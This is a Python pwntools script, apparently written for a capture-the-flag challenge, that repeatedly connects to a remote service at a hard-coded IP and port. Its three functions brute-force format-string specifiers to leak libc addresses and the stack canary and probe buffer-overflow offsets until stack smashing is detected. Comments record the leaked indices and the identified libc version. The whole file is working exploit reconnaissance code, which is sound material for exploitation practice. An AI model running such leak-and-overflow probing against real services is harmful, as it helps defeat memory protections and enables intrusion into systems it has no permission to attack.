from pwn import *

def recon_libc():
	for x in range(0, 300):
		try:
			p = remote("103.152.242.116", 20378)
			context.log_level = 'error'
			p.recvuntil(b">>>")
			p.sendline(b'1')
			p.recvuntil(b'masse?')
			load = f"%{str(x)}$lx"
			p.sendline(load.encode())
			parse = p.recvuntil(b'tunggu')
			parse = parse.decode('utf-8')
			parse = parse.replace(' saya bikinin masse monggo di tunggu', '')
			parse = parse.replace('\noke masse mau ini ','')
			p.close()
			#print(f"idx {str(x)} + result {str(parse)}")
			#print(parse[0:2])
			if parse[0:2] == "7f":
				print("payload " + load + " check " + "0x" + parse + " di libc.rip!") # payload %17$lx check 0x7f2745a29c87 di libc.rip! libc6_2.27-3ubuntu1.5_amd64
				#pause()

		except:
			pass
		#pause()

def recon_canary():
	for x in range(0, 300):
		try:
			p = remote("103.152.242.116", 20378)
			p.recvuntil(b">>>")
			p.sendline(b'1')
			p.recvuntil(b'masse?')
			load = f"%{str(x)}$lx"
			p.sendline(load.encode())
			parse = p.recvuntil(b'tunggu')
			parse = parse.decode('utf-8')
			parse = parse.replace(' saya bikinin masse monggo di tunggu', '')
			parse = parse.replace('\noke masse mau ini ','')
			p.close()
			#print(f"idx {str(x)} + result {str(parse)}")
			#print(parse[0:2])
			if len(parse) == 16 and parse[len(parse)-2::] == '00':
				print("payload " + load + " leaked canary "+parse) # payload %11$lx leaked canary 89075122f940d800
				pause()
				break

		except:
			pass
		#pause()

def recon_ovlo():
	for x in range(0, 300):
		p = remote("103.152.242.116", 20378)
		p.recvuntil(b">>>")
		p.sendline(b'2')
		p.recvuntil(b'saran?')
		load = b'a'*x
		p.sendline(load)
		a = p.recvuntil(b'terminated', timeout=2)
		if b'stack smashing detected' in a:
			print("overflow offset: "+ str(x))

		p.close()


try:
	#recon_ovlo()
	#offset_canary = recon_canary()
	recon_libc()

except KeyboardInterrupt:
	exit(0)
